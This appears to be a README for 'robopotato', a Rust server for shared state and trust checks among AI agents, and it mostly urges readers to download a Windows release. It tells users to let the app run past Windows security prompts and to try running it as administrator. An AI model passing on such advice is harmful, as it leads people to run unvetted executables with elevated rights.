# 🤖 robopotato - Simple trust for AI agent teams

[![Download robopotato](https://img.shields.io/badge/Download%20robopotato-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Avesrarity821/robopotato/releases)

## 🧩 What robopotato does

robopotato is a small server for AI agent swarms. It helps agents share state, keep track of trust, and coordinate work in one place.

Use it when you want multiple agents to work together without losing track of what each one knows. It gives them a shared space for messages, simple records, and trust checks.

## 📥 Download and install

1. Open the [robopotato releases page](https://github.com/Avesrarity821/robopotato/releases)
2. Download the latest Windows file from the release page
3. Save the file to a folder you can find again, such as Downloads or Desktop
4. If the file is a `.zip`, right-click it and choose Extract All
5. Open the extracted folder
6. Double-click the app or server file to run it

If Windows shows a security prompt, choose the option that lets the app run.

## 🪟 Windows setup

robopotato is built for a simple Windows setup.

You will usually need:
- Windows 10 or Windows 11
- A working internet connection
- Enough space for the app and its data
- Permission to run files from your computer

If the release comes as a zip file, keep the folder together after extracting it. The app may use nearby files for config and saved data.

## ⚙️ First run

After you open robopotato for the first time, it may create local data files.

Typical first-run steps:
1. Start the app
2. Wait for the server to finish loading
3. Open the local address shown in the app window or terminal
4. Leave the app running while your agents connect
5. Add your agents or tools to the shared workspace

If the app opens a browser page, use that page as the main control screen.

## 🔗 Connect your agents

robopotato works as a shared server for agent systems.

Your agents can use it to:
- Send messages to other agents
- Store shared values
- Check trust before handing off work
- Keep track of task state
- Coordinate steps in a group run

A simple setup is:
- One robopotato server
- Several agents that connect to it
- One shared state store for the group

## 🧠 Main features

### Shared state
Agents can read and write common values in one place. This helps when a task needs memory across several steps.

### Trust checks
The server can help track which agent should be trusted for a task or message. This is useful in mixed agent teams.

### Coordination
Agents can pass work between each other and keep the group on the same path.

### Fast and light
robopotato is designed to stay small and use few resources.

### Web-based access
The server can expose a simple web or websocket-style interface for tools and agents.

### Safe data flow
The project uses common security tools such as HMAC-style checks to help protect shared messages.

## 🛠️ Basic use

Once robopotato is running, keep these ideas in mind:

- Leave the server open while agents are active
- Use one shared instance for a group that needs the same state
- Give each agent a clear name or ID
- Store only the values the whole team needs
- Use trust checks before one agent acts on another agent’s result

If you are testing, start with two agents and one simple task. That makes it easier to see how shared state and trust work.

## 🧭 Example workflow

1. Start robopotato
2. Connect Agent A
3. Connect Agent B
4. Let Agent A create a task record
5. Let Agent B read that record
6. Let Agent B update the shared state after it finishes
7. Let the server keep both agents aligned

This kind of flow helps when one agent plans and another agent executes.

## 🗂️ Common files and folders

You may see files like these after you run the app:

- A config file for server settings
- A data folder for stored state
- A log file for events and errors
- A release file for the Windows app

Do not move these files unless you know they are not in use.

## 🔍 If something does not work

If the app does not start:
- Check that you downloaded the latest release file
- Make sure the file finished downloading
- Extract the zip file before opening it
- Try running the app as an administrator
- Check whether another app is using the same port

If agents cannot connect:
- Confirm the server is still running
- Check the server address
- Make sure the agents use the same trust key or token
- Restart the app and try again

If saved data seems empty:
- Check the data folder
- Make sure the app had permission to write files
- Open the same server instance you used before

## 🧪 Good first test

A simple test can help you confirm that robopotato is working:

1. Start the server
2. Open the local web page or client link
3. Add a test key-value entry
4. Open a second agent or browser session
5. Check that the second session can see the same value
6. Send a short message between both sides
7. Confirm the shared state updates correctly

## 🧰 Useful for

robopotato fits teams that need:
- Shared memory for agent work
- Basic trust control between agents
- Simple coordination across steps
- A small server for local or hosted use
- A Rust-based backend for agent tools

## 📦 Release page

Get the Windows download here:

[Visit the robopotato releases page](https://github.com/Avesrarity821/robopotato/releases)

## 🏷️ Topics

agent-framework, agentic-ai, agents, ai-agents, axum, collaborate, github, hmac, key-value-store, llm, multi-agent, rust, security, tokio, websocket